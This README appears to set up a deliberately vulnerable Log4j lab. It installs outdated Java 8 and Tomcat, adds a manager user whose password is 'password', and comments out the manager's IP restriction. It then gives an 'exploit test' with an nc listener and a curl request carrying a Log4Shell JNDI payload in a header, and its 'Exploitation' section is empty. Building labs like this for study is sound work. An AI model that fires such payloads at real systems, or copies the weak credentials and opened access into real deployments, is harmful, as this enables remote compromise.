# basic-vulnerable-log4j

## Setup of Vulnerable Java 8
To acquire older java versions you can go to: https://repo.huaweicloud.com/java/jdk/
This gives a directory listing titled "Index of java-local/jdk"
From here, we pick any version that we require. In our case we will go with 8u181-b13
As we are installing on Ubuntu, we pick linux-x64.tar.gz. To extract:
`tar -xf jdk-8u181-linux-x64.tar.gz`

`sudo mkdir /opt/jdk`
`sudo mv jdk1.8.0_181/ /opt/jdk`

Create symbolic links in /usr/bin for java and javac that point to /opt/jdk/jdk1.8.0_181/bin/java and /opt/jdk/jdk1.8.0_181/bin/javac

`update-alternatives --install /usr/bin/java java /opt/jdk/jdk1.8.0_181/bin/java 100`

`update-alternatives --install /usr/bin/javac javac /opt/jdk/jdk1.8.0_181/bin/javac 100`

verify:
`java -version`
`javac -version`

We want to set JAVA_HOME environment variable for all users:
`sudo touch /etc/profile.d/java-home.sh`
`sudo echo "export JAVA_HOME=/opt/jdk/jdk1.8.0_181/" >> /etc/profile.d/java-home.sh`
`source /etc/profile.d/java-home.sh`

## Setting up tomcat to deploy application
`sudo groupadd tomcat`
`sudo useradd -s /bin/bash -g tomcat -d /opt/tomcat tomcat`

To find vulnerable version of Tomcat:
Go to https://archive.apache.org/dist/tomcat/tomcat-9/
We are going to download 9.0.0.M1, we go to bin and copy the tar.gz link for that
`sudo mkdir /opt/tomcat`
`sudo tar xzvf apache-tomcat-*tar.gz -C /opt/tomcat --strip-components=1`
Giving group ownership to tomcat of /opt/tomcat
`sudo chgrp -R tomcat /opt/tomcat`
give the tomcat group read access to the conf directory and all of its contents, and execute access to the directory itself:
`sudo chmod -R g+r conf`
`sudo chmod g+x conf`

Make the tomcat user the owner of the webapps, work, temp, and logs directories:
`sudo chown -R tomcat webapps/ work/ temp/ logs/`
Create and edit:
`sudo nano /etc/systemd/system/tomcat.service`

```
[Unit]
Description=Apache Tomcat Web Application Container
After=network.target

[Service]
Type=forking

Environment=JAVA_HOME=/opt/jdk/jdk1.8.0_181
Environment=CATALINA_PID=/opt/tomcat/temp/tomcat.pid
Environment=CATALINA_HOME=/opt/tomcat
Environment=CATALINA_BASE=/opt/tomcat
Environment='CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC'
Environment='JAVA_OPTS=-Djava.awt.headless=true -Djava.security.egd=file:/dev/./urandom'

ExecStart="/opt/tomcat/bin/startup.sh"
ExecStop="/opt/tomcat/bin/shutdown.sh"

User=tomcat
Group=tomcat
UMask=0007
RestartSec=10
Restart=always

[Install]
WantedBy=multi-user.target
```
`sudo systemctl daemon-reload`
`sudo systemctl enable --now tomcat`

Configure Tomcat Web Management Interface
`sudo nano /opt/tomcat/conf/tomcat-users.xml`
add a user who can access the manager-gui and admin-gui (web apps that come with Tomcat).
```
<tomcat-users . . .>
    <user username="admin" password="password" roles="manager-gui,admin-gui"/>
</tomcat-users>
```
Newer versions of tomcat restrict access to manager and host manager apps to connections from server itself.
To change IP restrictions to allow remote access:

In Manager App, modify:
`sudo nano /opt/tomcat/webapps/manager/META-INF/context.xml`

Host Manager app, modify:
`sudo nano /opt/tomcat/webapps/host-manager/META-INF/context.xml`
Comment entry
```
<Context antiResourceLocking="false" privileged="true" >
  <!--<Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />-->
</Context>
```

Web Application Manager: http://127.0.0.1:8080/manager/html
Tomcat Virtual Host Manager: http:/127.0.0.1:8080/host-manager/html


exploit test:
`nc -lvnp 9999`

```
curl --location 'http://localhost:8080/heroes' \
--header 'X-Api-Version: ${jndi:ldap://127.0.0.1:9999}'
```

## Exploitation:
